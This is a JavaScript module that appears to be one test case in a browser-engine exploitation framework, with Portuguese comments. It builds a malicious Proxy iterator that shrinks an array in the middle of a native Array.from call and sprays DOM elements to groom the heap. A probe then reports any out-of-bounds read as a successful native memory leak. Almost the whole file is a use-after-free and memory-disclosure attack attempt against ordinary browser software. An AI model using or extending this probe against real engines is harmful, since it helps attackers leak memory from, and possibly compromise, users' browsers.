import { Groomer } from '../mod_groomer.js';

export default {
    id:       'NATIVE_CALLBACK_MUTATION_UAF',
    category: 'CoreJS',
    risk:     'HIGH',
    description:
        'Abusa do Array.from nativo C++ usando um iterador Proxy. Quando o motor C++ ' +
        'solicita o próximo valor, o Proxy destrói o array subjacente. Foca na falha ' +
        'do interpretador em revalidar os ponteiros do Butterfly no meio de uma iteração Proxy.',

    setup: function() {
        this.results = {};
        this.vulnArray = [1.1, 2.2, 3.3, 4.4, 5.5];
        
        const self = this;
        this.triggerCount = 0;

        // Criamos um Proxy que atua como um iterador malicioso
        this.evilIterator = new Proxy(this.vulnArray, {
            get(target, prop) {
                if (prop === 'length') return 5;
                
                // O C++ vai pedir índices (0, 1, 2...)
                if (prop === '2') {
                    // O GATILHO: A meio da iteração nativa, destruímos os dados!
                    target.length = 0;
                    
                    // Lixo imediato no heap para ocupar o espaço livre
                    let trash = Groomer.sprayDOM('div', 500);
                }
                return target[prop];
            }
        });
    },

    trigger: function() {
        try {
            // Array.from é implementado em C++ bruto. Ele vai ler o nosso Proxy
            // sem saber que a memória pode desaparecer no índice 2.
            this.results.forgedArray = Array.from(this.evilIterator);
        } catch(e) {
            this.results.error = e.message;
        }
    },

    probe: [
        // Probe 0: O tamanho do array forjado
        s => s.results.forgedArray ? s.results.forgedArray.length : 'Falhou',
        
        // Probe 1: O Leitor de OOB/UAF
        s => {
            if (s.results.forgedArray) {
                // O C++ deveria ter preenchido com 'undefined' após o array encolher.
                // Se no índice 3 ou 4 houver números reais (ou lixo C++), é Info Leak!
                let val = s.results.forgedArray[3];
                if (typeof val === 'number' && !isNaN(val)) {
                    return `💥 SUCESSO! OOB Read da Ram Nativa: ${val}`;
                }
                return 'Seguro (Preenchido com undefined)';
            }
            return s.results.error || 'Erro desconhecido';
        }
    ],

    cleanup: function() {
        this.vulnArray = null;
        this.evilIterator = null;
        this.results = {};
    }
};
